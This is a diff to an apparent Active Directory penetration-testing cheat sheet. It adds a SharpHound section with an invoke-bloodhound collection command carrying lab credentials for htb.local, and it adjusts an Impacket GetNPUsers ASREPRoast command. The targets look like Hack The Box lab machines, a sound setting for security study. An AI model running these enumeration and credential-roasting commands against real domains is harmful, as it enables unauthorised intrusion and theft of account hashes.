@@ -22,6 +22,7 @@ Active Directory follows a clear hierarchy, from top to bottom. In that hierarch
       - [DCsync Attack](#dcsync-attack)
       - [ASREPRoast](#asreproast)
       - [Pass The Hash](#pass-the-hash)
+      - [SharpHound](#sharphound)
 
 ### Enumeration
 
@@ -417,7 +418,7 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
   #Trying the attack for the specified users on the file
   python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
 
-  sudo python3 GetNPUsers.py controller.local/ -usersfile /tmp/user.txt
+  sudo python3 GetNPUsers.py controller.local/ -usersfile /tmp/user.txt -dc-ip $ip
   ```
 #### Pass The Hash
 ```
@@ -441,4 +442,9 @@ Golden Tickets
 If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: ntpdate <IP of DC>
 
 sudo ntpdate apt.htb.local
+```
+
+#### SharpHound
+```
+invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
 ```
